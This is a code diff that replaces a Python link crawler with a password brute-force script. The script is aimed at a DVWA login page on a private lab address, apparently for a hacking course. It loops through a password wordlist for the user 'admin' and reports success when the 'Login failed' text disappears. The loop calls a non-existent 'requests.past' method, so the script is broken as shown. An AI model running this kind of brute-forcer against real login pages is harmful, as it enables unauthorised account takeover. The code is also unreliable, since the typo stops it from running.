@@ -19,28 +19,21 @@
 #!/usr/bin/env python                                                                                    
 
 import requests
-import re
-import urlparse
 
 
-target_url = "https://exemple.com"
-target_links = []
+target_url = "http://10.0.2.20/dvwa/login.php"
+data_dict = {"username": "admin", "password": "", "Login": "submit"}
+response = requests.post(target_url, data=data_dict)
+print(response.content)
 
-def extract_links_from(url):
-    response = requests.get(url)
-    return re.findall('(?:href=")(.*?)"', response.content)
 
-def crawl(url):
-    href_links = extract_links_from(target_url)
-    for link in href_links:
-        link = urlparse.urljoin(target_url, link)
+with open("/root/Downloads/passwords.list", "r") as wordlist_file:
+    for line in wordlist_file:
+        word = line.strip()
+        data_dict["password"] = word
+        response = requests.past(target_url, data=data_dict)
+        if "Login failed" not in response.content:
+            print("[+] Got the password --> " + word)
+            exit()
 
-    if "#" in link:
-        link = link.split("#")[0]
-
-        if target_url in link and link not in target_links:
-            target_links.append(link)
-            print(link)
-            crawl(link)
-
-crawl(target_url)
+print("[+] Reached end of line.")
